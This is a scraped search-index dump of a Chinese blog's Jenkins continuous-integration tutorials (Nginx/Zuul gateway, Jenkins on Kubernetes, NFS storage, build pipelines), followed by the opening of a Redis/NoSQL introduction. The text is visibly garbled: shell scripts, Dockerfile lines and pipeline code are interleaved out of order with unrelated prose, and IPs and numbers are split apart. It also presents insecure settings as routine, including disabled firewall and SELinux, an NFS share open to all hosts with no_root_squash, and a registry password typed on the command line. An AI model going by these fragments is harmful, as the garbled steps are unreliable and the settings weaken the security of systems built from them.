//把选择的服务区信息转为数组 def selectedServers = \"${publish_server}\".split(',') stage('拉取代码') { checkout([$class: 'GitSCM', branches: [[name: '*/${branch}']], doGenerateSubm","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:6:6","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Nginx+Zuul集群实现高可用网关 1 ）安装Nginx（已完成） 2 ）修改Nginx配置 vi /etc/nginx/nginx.conf 内容如下： docker stop $containerId #删除容器 docker rm $containerId echo \"成功删除容器\" fi #查询镜像是否存在，存在则删除 imageId=`docker images | grep - w $project_name | awk '{print $ 3 }'` if [ \"$imageId\" != \"\" ] ; then #删除镜像 docker rmi - f $imageId echo \"成功删除镜像\" fi # 登录Harbor私服 docker login - u itcast - p Itcast 123 $harbor_url # 下载镜像 docker pull $imageName # 启动容器 docker run - di - p $port:$port $imageName $profile echo \"容器启动成功\" upstream zuulServer{ 3 ）重启Nginx： systemctl restart nginx 4 ）修改前端Nginx的访问地址 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:6:7","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"6 、基于Kubernetes/K8S构建Jenkins持续集成平台(上) ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:7:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins的Master-Slave分布式构建 什么是Master-Slave分布式构建 server 192. 168. 66. 103 : 10020 weight= 1 ; server 192. 168. 66. 104 : 10020 weight= 1 ; } server { listen 85 default_server; listen [::]: 85 default_server; server_name _; root /usr/share/nginx/html; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / { ### 指定服务器负载均衡服务器 proxy_pass http://zuulServer/; } Jenkins的Master-Slave分布式构建，就是通过将构建过程分配到从属Slave节点上，从而减轻Master节 点的压力，而且可以同时构建多个，有点类似负载均衡的概念。 如何实现Master-Slave分布式构建 1 ）开启代理程序的TCP端口 Manage Jenkins -\u003e Configure Global Security 2 ）新建节点 Manage Jenkins—Manage Nodes—新建节点 有两种在Slave节点连接Master节点的方法 我们选择第二种： 2 ）安装和配置节点 下载agent.jar，并上传到Slave节点，然后执行页面提示的命令： 刷新页面 java - jar agent.jar - jnlpUrl http:// 192. 168. 66. 101 : 8888 /computer/slave 1 /slave- agent.jnlp - secret f 2 ecbb 99 e 0 c 81331 e 8 b 7 a 7917 a 94 d 478 f 39 cb 9763 fc 6 c 66 d 9 a 9741 c 61 f 9 ae 6 d 6 - workDir \"/root/jenkins\" 3 ）测试节点是否可用 自由风格和Maven风格的项目： 流水线风格的项目： ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:7:1","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Kubernetes实现Master-Slave分布式构建方案 传统Jenkins的Master-Slave方案的缺陷 Master节点发生单点故障时，整个流程都不可用了 每个 Slave节点的配置环境不一样，来完成不同语言的编译打包等操作，但是这些差异化的配置导 致管理起来非常不方便，维护起来也是比较费劲 资源分配不均衡，有的 Slave节点要运行的job出现排队等待，而有的Slave节点处于空闲状态 资源浪费，每台 Slave节点可能是实体机或者VM，当Slave节点处于空闲状态时，也不会完全释放 掉资源 以上种种问题，我们可以引入Kubernates来解决！ Kubernates简介 node('slave 1 ') { stage('check out') { checkout([$class: 'GitSCM', branches: [[name: '*/master']], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: ' 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 ', url: 'git@ 192. 168. 66. 100 :itheima_group/tensquare_back_cluster.git']]]) } } Kubernetes（简称，K8S）是Google开源的容器集群管理系统，在Docker技术的基础上，为容器化的 应用提供部署运行、资源调度、服务发现和动态伸缩等一系列完整功能，提高了大规模容器集群管理的 便捷性。 其主要功能如下： 使用Docker对应用程序包装(package)、实例化(instantiate)、运行(run)。 以集群的方式运行、管理跨机器的容器。以集群的方式运行、管理跨机器的容器。 解决Docker跨机器容器之间的通讯问题。解决Docker跨机器容器之间的通讯问题。 Kubernetes的自我修复机制使得容器集群总是运行在用户期望的状态。 Kubernates+Docker+Jenkins持续集成架构图 大致工作流程：手动/自动构建 -\u003e Jenkins 调度 K8S API -＞动态生成 Jenkins Slave pod -＞ Slave pod 拉取 Git 代码／编译／打包镜像 -＞推送到镜像仓库 Harbor -＞ Slave 工作完成，Pod 自动销毁 -＞部署 到测试或生产 Kubernetes平台。（完全自动化，无需人工干预） Kubernates+Docker+Jenkins持续集成方案好处 服务高可用：当 Jenkins Master 出现故障时，Kubernetes 会自动创建一个新的 Jenkins Master 容器，并且将 Volume 分配给新创建的容器，保证数据不丢失，从而达到集群服务高可用。 动态伸缩，合理使用资源：每次运行 Job 时，会自动创建一个 Jenkins Slave，Job 完成后，Slave 自动注销并删除容器，资源自动释放，而且 Kubernetes 会根据每个资源的使用情况，动态分配 Slave 到空闲的节点上创建，降低出现因某节点资源利用率高，还排队等待在该节点的情况。 扩展性好：当 Kubernetes 集群的资源严重不足而导致 Job 排队等待时，可以很容易的添加一个 Kubernetes Node 到集群中，从而实现扩展。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:7:2","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Kubeadm安装Kubernetes Kubernetes的架构 API Server：用于暴露Kubernetes API，任何资源的请求的调用操作都是通过kube-apiserver提供的接 口进行的。 Etcd：是Kubernetes提供默认的存储系统，保存所有集群数据，使用时需要为etcd数据提供备份计 划。 Controller-Manager：作为集群内部的管理控制中心，负责集群内的Node、Pod副本、服务端点 （Endpoint）、命名空间（Namespace）、服务账号（ServiceAccount）、资源定额 （ResourceQuota）的管理，当某个Node意外宕机时，Controller Manager会及时发现并执行自动化 修复流程，确保集群始终处于预期的工作状态。 Scheduler：监视新创建没有分配到Node的Pod，为Pod选择一个Node。 Kubelet：负责维护容器的生命周期，同时负责Volume和网络的管理 Kube proxy：是Kubernetes的核心组件，部署在每个Node节点上，它是实现Kubernetes Service的通 信与负载均衡机制的重要组件。 安装环境说明 主机名称 IP地址 安装的软件 代码托管服 务器 192.168.66.100 Gitlab-12.4.2 Docker仓库 服务器 192.168.66.102 Harbor1.9.2 k8s-master 192.168.66.101 kube-apiserverscheduler、dock、erkube-contr、etcd、calicooller-manager，NFS 、kube- k8s-node1 192.168.66.103 kubelet、kubeproxy、Docker18.06.1-ce k8s-node2 192.168.66.104 kubelet、kubeproxy、Docker18.06.1-ce 三台机器都需要完成 修改三台机器的hostname及hosts文件 hostnamectl set-hostname k8s-master hostnamectl set-hostname k8s-node1 hostnamectl set-hostname k8s-node2 cat \u003e\u003e/etc/hosts\u003c\u003cEOF 192.168.66.101 k8s-master 192.168.66.103 k8s-node1 192.168.66.104 k8s-node2 EOF 关闭防火墙和关闭SELinux systemctl stop firewalld systemctl disable firewalld setenforce 0 临时关闭 vi /etc/sysconfig/selinux 永久关闭 改为SELINUX=disabled 设置系统参数 设置允许路由转发，不对bridge的数据进行处理 创建文件 vi /etc/sysctl.d/k8s.conf 内容如下： net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward = 1 vm.swappiness = 0 执行文件 sysctl -p /etc/sysctl.d/k8s.conf kube-proxy开启ipvs的前置条件^ 所有节点关闭swap swapoff -a 临时关闭 vi /etc/fstab 永久关闭 注释掉以下字段 /dev/mapper/cl-swap swap swap defaults 0 0 安装kubelet、kubeadm、kubectl kubeadm: 用来初始化集群的指令。 kubelet: 在集群中的每个节点上用来启动 pod 和 container 等。 kubectl: 用来与集群通信的命令行工具。 清空yum缓存 设置yum安装源 安装： kubelet设置开机启动（注意：先不启动，现在启动的话会报错） cat \u003e /etc/sysconfig/modules/ipvs.modules \u003c\u003cEOF #!/bin/bash modprobe - - ip_vs modprobe - - ip_vs_rr modprobe - - ip_vs_wrr modprobe - - ip_vs_sh modprobe - - nf_conntrack_ipv 4 EOF chmod 755 /etc/sysconfig/modules/ipvs.modules \u0026\u0026 bash /etc/sysconfig/modules/ipvs.mo","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:7:3","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"7 、基于Kubernetes/K8S构建Jenkins持续集成平台(下) Jenkins-Master-Slave架构图回顾： ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:8:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"安装和配置NFS NFS简介 NFS（Network File System），它最大的功能就是可以通过网络，让不同的机器、不同的操作系统可以 共享彼此的文件。我们可以利用NFS共享Jenkins运行的配置文件、Maven的仓库依赖文件等 NFS安装 kubectl get nodes 查看所有主从节点的状态 kubectl get ns 获取所有namespace资源 kubectl get pods - n {$nameSpace} 获取指定namespace的pod kubectl describe pod的名称 - n {$nameSpace} 查看某个pod的执行过程 kubectl logs - -tail= 1000 pod的名称 | less 查看日志 kubectl create - f xxx.yml 通过配置文件创建一个集群资源对象 kubectl delete - f xxx.yml 通过配置文件删除一个集群资源对象 kubectl delete pod名称 - n {$nameSpace} 通过pod删除集群资源 kubectl get service - n {$nameSpace} 查看pod的service情况 我们把NFS服务器安装在192.168.66.101机器上 1 ）安装NFS服务（在所有K8S的节点都需要安装） 2 ）创建共享目录 3 ）启动服务 4 ）查看NFS共享目录 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:8:1","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"在Kubernetes安装Jenkins-Master 创建NFS client provisioner nfs-client-provisioner 是一个Kubernetes的简易NFS的外部provisioner，本身不提供NFS，需要现有 的NFS服务器提供存储。 1 ）上传nfs-client-provisioner构建文件 其中注意修改deployment.yaml，使用之前配置NFS服务器和目录 yum install - y nfs-utils mkdir - p /opt/nfs/jenkins vi /etc/exports 编写NFS的共享配置 内容如下: /opt/nfs/jenkins *(rw,no_root_squash) *代表对所有IP都开放此目录，rw是读写 systemctl enable nfs 开机启动 systemctl start nfs 启动 showmount - e 192. 168. 66. 101 2 ）构建nfs-client-provisioner的pod资源 3 ）查看pod是否创建成功 安装Jenkins-Master 1 ）上传Jenkins-Master构建文件 其中有两点注意： 第一、在StatefulSet.yaml文件，声明了利用nfs-client-provisioner进行Jenkins-Master文件存储 第二、Service发布方法采用NodePort，会随机产生节点访问端口 cd nfs-client kubectl create - f. 2 ）创建kube-ops的namespace 因为我们把Jenkins-Master的pod放到kube-ops下 3 ）构建Jenkins-Master的pod资源 4 ）查看pod是否创建成功 5 ）查看信息，并访问 查看Pod运行在那个Node上 查看分配的端口 kubectl create namespace kube-ops cd jenkins-master kubectl create - f. kubectl get pods - n kube-ops kubectl describe pods - n kube-ops kubectl get service - n kube-ops 最终访问地址为：http://192.168.66.103:30136 （192.168.66.103为k8s-node1的IP） 安装过程跟之前是一样的！ 6 ）先安装基本的插件 Localization:Chinese Git Pipeline Extended Choice Parameter ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:8:2","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins与Kubernetes整合 安装Kubernetes插件 系统管理-\u003e插件管理-\u003e可选插件 实现Jenkins与Kubernetes整合 系统管理-\u003e系统配置-\u003e云-\u003e新建云-\u003eKubernetes kubernetes地址采用了kube的服务器发现：https://kubernetes.default.svc.cluster.local namespace填kube-ops，然后点击Test Connection，如果出现 Connection test successful 的提 示信息证明 Jenkins 已经可以和 Kubernetes 系统正常通信 Jenkins URL 地址：http://jenkins.kube-ops.svc.cluster.local:8080 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:8:3","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"构建Jenkins-Slave自定义镜像 Jenkins-Master在构建Job的时候，Kubernetes会创建Jenkins-Slave的Pod来完成Job的构建。我们选择 运行Jenkins-Slave的镜像为官方推荐镜像：jenkins/jnlp-slave:latest，但是这个镜像里面并没有Maven 环境，为了方便使用，我们需要自定义一个新的镜像： 准备材料： Dockerfile文件内容如下： FROM jenkins/jnlp-slave:latest MAINTAINER itcast # 切换到 root 账户进行操作 USER root # 安装 maven COPY apache-maven- 3. 6. 2 - bin.tar.gz. RUN tar - zxf apache-maven- 3. 6. 2 - bin.tar.gz \u0026\u0026 \\ mv apache-maven- 3. 6. 2 /usr/local \u0026\u0026 \\ rm - f apache-maven- 3. 6. 2 - bin.tar.gz \u0026\u0026 \\ ln - s /usr/local/apache-maven- 3. 6. 2 /bin/mvn /usr/bin/mvn \u0026\u0026 \\ 构建出一个新镜像：jenkins-slave-maven:latest 然把镜像上传到Harbor的公共库library中 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:8:4","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"测试Jenkins-Slave是否可以创建 1 ）创建一个Jenkins流水线项目 2 ）编写Pipeline，从GItlab拉取代码 ln - s /usr/local/apache-maven- 3. 6. 2 /usr/local/apache-maven \u0026\u0026 \\ mkdir - p /usr/local/apache-maven/repo COPY settings.xml /usr/local/apache-maven/conf/settings.xml USER jenkins docker tag jenkins-slave-maven:latest 192. 168. 66. 102 : 85 /library/jenkins-slave- maven:latest docker push 192. 168. 66. 102 : 85 /library/jenkins-slave-maven:latest def git_address = \"http:// 192. 168. 66. 100 : 82 /itheima_group/tensquare_back_cluster.git\" def git_auth = \" 9 d 9 a 2707 - eab 7 - 4 dc 9 - b 106 - e 52 f 329 cbc 95 \" //创建一个Pod的模板，label为jenkins-slave podTemplate(label: 'jenkins-slave', cloud: 'kubernetes', containers: [ containerTemplate( name: 'jnlp', image: \" 192. 168. 66. 102 : 85 /library/jenkins-slave-maven:latest\" ) ] ) { //引用jenkins-slave的pod模块来构建Jenkins-Slave的pod node(\"jenkins-slave\"){ // 第一步 stage('拉取代码'){ checkout([$class: 'GitSCM', branches: [[name: 'master']], userRemoteConfigs: [[credentialsId: \"${git_auth}\", url: \"${git_address}\"]]]) } } 3 ）查看构建日志 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:8:5","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins+Kubernetes+Docker完成微服务持续集成 拉取代码，构建镜像 1 ）创建NFS共享目录 让所有Jenkins-Slave构建指向NFS的Maven的共享仓库目录 2 ）创建项目，编写构建Pipeline } vi /etc/exports 添加内容： /opt/nfs/jenkins *(rw,no_root_squash) /opt/nfs/maven *(rw,no_root_squash) systemctl restart nfs 重启NFS def git_address = “http:// 192. 168. 66. 100 : 82 /itheima_group/tensquare_back_cluster.git” def git_auth = \" 9 d 9 a 2707 - eab 7 - 4 dc 9 - b 106 - e 52 f 329 cbc 95 \" //构建版本的名称 def tag = “latest” //Harbor私服地址 def harbor_url = \" 192. 168. 66. 102 : 85 \" //Harbor的项目名称 def harbor_project_name = “tensquare” //Harbor的凭证 def harbor_auth = \" 71 eff 071 - ec 17 - 4219 - bae 1 - 5 d 0093 e 3 d 060 \" podTemplate(label: ‘jenkins-slave’, cloud: ‘kubernetes’, containers: [ containerTemplate( name: ‘jnlp’, image: \" 192. 168. 66. 102 : 85 /library/jenkins-slave-maven:latest\" ), containerTemplate( name: ‘docker’, image: “docker:stable”, ttyEnabled: true, command: ‘cat’ ), ], volumes: [ hostPathVolume(mountPath: ‘/var/run/docker.sock’, hostPath: ‘/var/run/docker.sock’), nfsVolume(mountPath: ‘/usr/local/apache-maven/repo’, serverAddress: ’ 192. 168. 66. 101 ’ , serverPath: ‘/opt/nfs/maven’), ], ) { node(“jenkins-slave”){ // 第一步 stage(‘拉取代码’){ checkout([$class: ‘GitSCM’, branches: [[name: ‘${branch}’]], userRemoteConfigs: [[credentialsId: “${git_auth}”, url: “${git_address}”]]]) } // 第二步 stage(‘代码编译’){ //编译并安装公共工程 sh “mvn - f tensquare_common clean install” } // 第三步 stage(‘构建镜像，部署项目’){ //把选择的项目信息转为数组 def selectedProjects = “${project_name}\".split(’,’) for(int i= 0 ;i\u003cselectedProjects.size();i++){ //取出每个项目的名称和端口 def currentProject = selectedProjects[i]; //项目名称 def currentProjectName = currentProject.split(’@’)[ 0 ] //项目启动端口 def currentProjectPort = currentProject.split(’@’)[ 1 ] //定义镜像名称 注意：在构建过程会发现无法创建仓库目录，是因为NFS共享目录权限不足，需更改权限 还有Docker命令执行权限问题 需要手动上传父工程依赖到NFS的Maven共享仓库目录中 微服务部署到K8S def imageName = \"${currentProjectName}:${tag}\" //编译，构建本地镜像 sh \"mvn - f ${currentProjectName} clean package dockerfile:build\" container('docker') { //给镜像打标签 sh \"docke","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:8:6","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["数据库"],"content":"一、Nosql概述 ","date":"2021-04-06","objectID":"/posts/redis/:1:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"为什么使用Nosql 1、单机Mysql时代 90年代,一个网站的访问量一般不会太大，单个数据库完全够用。随着用户增多，网站出现以下问题 数据量增加到一定程度，单机数据库就放不下了 数据的索引（B+ Tree）,一个机器内存也存放不下 访问量变大后（读写混合），一台服务器承受不住。 2、Memcached(缓存) + Mysql + 垂直拆分（读写分离） 网站80%的情况都是在读，每次都要去查询数据库的话就十分的麻烦！所以说我们希望减轻数据库的压力，我们可以使用缓存来保证效率！ 优化过程经历了以下几个过程： 优化数据库的数据结构和索引(难度大) 文件缓存，通过IO流获取比每次都访问数据库效率略高，但是流量爆炸式增长时候，IO流也承受不了 MemCache,当时最热门的技术，通过在数据库和数据库访问层之间加上一层缓存，第一次访问时查询数据库，将结果保存到缓存，后续的查询先检查缓存，若有直接拿去使用，效率显著提升。 3、分库分表 + 水平拆分 + Mysql集群 4、如今最近的年代 如今信息量井喷式增长，各种各样的数据出现（用户定位数据，图片数据等），大数据的背景下关系型数据库（RDBMS）无法满足大量数据要求。Nosql数据库就能轻松解决这些问题。 目前一个基本的互联网项目 为什么要用NoSQL ？ 用户的个人信息，社交网络，地理位置。用户自己产生的数据，用户日志等等爆发式增长！ 这时候我们就需要使用NoSQL数据库的，Nosql可以很好的处理以上的情况！ ","date":"2021-04-06","objectID":"/posts/redis/:1:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"什么是Nosql NoSQL = Not Only SQL（不仅仅是SQL） Not Only Structured Query Language 关系型数据库：列+行，同一个表下数据的结构是一样的。 非关系型数据库：数据存储没有固定的格式，并且可以进行横向扩展。 NoSQL泛指非关系型数据库，随着web2.0互联网的诞生，传统的关系型数据库很难对付web2.0时代！尤其是超大规模的高并发的社区，暴露出来很多难以克服的问题，NoSQL在当今大数据环境下发展的十分迅速，Redis是发展最快的。 ","date":"2021-04-06","objectID":"/posts/redis/:1:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Nosql特点 方便扩展（数据之间没有关系，很好扩展！） 大数据量高性能（Redis一秒可以写8万次，读11万次，NoSQL的缓存记录级，是一种细粒度的缓存，性能会比较高！） 数据类型是多样型的！（不需要事先设计数据库，随取随用） 传统的 RDBMS 和 NoSQL 传统的 RDBMS(关系型数据库) - 结构化组织 - SQL - 数据和关系都存在单独的表中 row col - 操作，数据定义语言 - 严格的一致性 - 基础的事务 - ... Nosql - 不仅仅是数据 - 没有固定的查询语言 - 键值对存储，列存储，文档存储，图形数据库（社交关系） - 最终一致性 - CAP定理和BASE - 高性能，高可用，高扩展 - ... 了解：3V + 3高 大数据时代的3V ：主要是描述问题的 海量Velume 多样Variety 实时Velocity 大数据时代的3高 ： 主要是对程序的要求 高并发 高可扩 高性能 真正在公司中的实践：NoSQL + RDBMS 一起使用才是最强的。 ","date":"2021-04-06","objectID":"/posts/redis/:1:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"阿里巴巴演进分析 推荐阅读：阿里云的这群疯子https://yq.aliyun.com/articles/653511 # 商品信息 - 一般存放在关系型数据库：Mysql,阿里巴巴使用的Mysql都是经过内部改动的。 # 商品描述、评论(文字居多) - 文档型数据库：MongoDB # 图片 - 分布式文件系统 FastDFS - 淘宝：TFS - Google: GFS - Hadoop: HDFS - 阿里云: oss # 商品关键字 用于搜索 - 搜索引擎：solr,elasticsearch - 阿里：Isearch 多隆 # 商品热门的波段信息 - 内存数据库：Redis，Memcache # 商品交易，外部支付接口 - 第三方应用 ","date":"2021-04-06","objectID":"/posts/redis/:1:4","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Nosql的四大分类 KV键值对 新浪：Redis 美团：Redis + Tair 阿里、百度：Redis + Memcache 文档型数据库（bson数据格式）： MongoDB(掌握) 基于分布式文件存储的数据库。C++编写，用于处理大量文档。 MongoDB是RDBMS和NoSQL的中间产品。MongoDB是非关系型数据库中功能最丰富的，NoSQL中最像关系型数据库的数据库。 ConthDB 列存储数据库 HBase(大数据必学) 分布式文件系统 图关系数据库 用于广告推荐，社交网络 Neo4j、InfoGrid 分类 Examples举例 典型应用场景 数据模型 优点 缺点 键值对（key-value） Tokyo Cabinet/Tyrant, Redis, Voldemort, Oracle BDB 内容缓存，主要用于处理大量数据的高访问负载，也用于一些日志系统等等。 Key 指向 Value 的键值对，通常用hash table来实现 查找速度快 数据无结构化，通常只被当作字符串或者二进制数据 列存储数据库 Cassandra, HBase, Riak 分布式的文件系统 以列簇式存储，将同一列数据存在一起 查找速度快，可扩展性强，更容易进行分布式扩展 功能相对局限 文档型数据库 CouchDB, MongoDb Web应用（与Key-Value类似，Value是结构化的，不同的是数据库能够了解Value的内容） Key-Value对应的键值对，Value为结构化数据 数据结构要求不严格，表结构可变，不需要像关系型数据库一样需要预先定义表结构 查询性能不高，而且缺乏统一的查询语法。 图形(Graph)数据库 Neo4J, InfoGrid, Infinite Graph 社交网络，推荐系统等。专注于构建关系图谱 图结构 利用图结构相关算法。比如最短路径寻址，N度关系查找等 很多时候需要对整个图做计算才能得出需要的信息，而且这种结构不太好做分布式的集群 ","date":"2021-04-06","objectID":"/posts/redis/:1:5","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"二、Redis入门 ","date":"2021-04-06","objectID":"/posts/redis/:2:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"概述 Redis是什么？ Redis（Remote Dictionary Server )，即远程字典服务。 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。 Redis能该干什么？ 内存存储、持久化，内存是断电即失的，所以需要持久化（RDB、AOF） 高效率、用于高速缓冲 发布订阅系统 地图信息分析 计时器、计数器(eg：浏览量) 。。。 特性 多样的数据类型 持久化 集群 事务 … ","date":"2021-04-06","objectID":"/posts/redis/:2:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"环境搭建 官网：https://redis.io/ 推荐使用Linux服务器学习。 windows版本的Redis已经停更很久了… ","date":"2021-04-06","objectID":"/posts/redis/:2:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Windows安装 https://github.com/dmajkic/redis 解压安装包 开启redis-server.exe 启动redis-cli.exe测试 ","date":"2021-04-06","objectID":"/posts/redis/:2:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Linux安装 下载安装包！redis-5.0.8.tar.gz 解压Redis的安装包！程序一般放在 /opt 目录下 基本环境安装 yum install gcc-c++ # 然后进入redis目录下执行 make # 然后执行 make install redis默认安装路径 `/usr/local/bin 将redis的配置文件复制到 程序安装目录 /usr/local/bin/kconfig下 redis默认不是后台启动的，需要修改配置文件！ 通过制定的配置文件启动redis服务 使用redis-cli连接指定的端口号测试，Redis的默认端口6379 查看redis进程是否开启 关闭Redis服务 shutdown 再次查看进程是否存在 后面我们会使用单机多Redis启动集群测试 ","date":"2021-04-06","objectID":"/posts/redis/:2:4","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"测试性能 **redis-benchmark：**Redis官方提供的性能测试工具，参数选项如下： 简单测试： # 测试：100个并发连接 100000请求 redis-benchmark -h localhost -p 6379 -c 100 -n 100000 12 ","date":"2021-04-06","objectID":"/posts/redis/:2:5","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"基础知识 redis默认有16个数据库 默认使用的第0个; 16个数据库为：DB 0~DB 15 默认使用DB 0 ，可以使用select n切换到DB n，dbsize可以查看当前数据库的大小，与key数量相关。 127.0.0.1:6379\u003e config get databases # 命令行查看数据库数量databases 1) \"databases\" 2) \"16\" 127.0.0.1:6379\u003e select 8 # 切换数据库 DB 8 OK 127.0.0.1:6379[8]\u003e dbsize # 查看数据库大小 (integer) 0 # 不同数据库之间 数据是不能互通的，并且dbsize 是根据库中key的个数。 127.0.0.1:6379\u003e set name sakura OK 127.0.0.1:6379\u003e SELECT 8 OK 127.0.0.1:6379[8]\u003e get name # db8中并不能获取db0中的键值对。 (nil) 127.0.0.1:6379[8]\u003e DBSIZE (integer) 0 127.0.0.1:6379[8]\u003e SELECT 0 OK 127.0.0.1:6379\u003e keys * 1) \"counter:__rand_int__\" 2) \"mylist\" 3) \"name\" 4) \"key:__rand_int__\" 5) 